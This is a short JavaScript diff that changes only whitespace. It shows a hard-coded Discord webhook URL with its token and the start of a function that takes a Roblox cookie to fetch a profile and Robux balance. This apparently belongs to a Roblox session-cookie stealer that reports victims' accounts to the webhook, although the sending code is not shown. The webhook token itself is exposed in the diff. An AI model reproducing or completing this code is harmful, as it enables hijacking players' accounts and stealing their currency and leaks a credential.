@@ -1,5 +1,5 @@
 // Direct Discord Webhook URL
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ'; 
 
 // Function to fetch Roblox profile and Robux amount
 async function fetchRobloxProfile(cookie) {
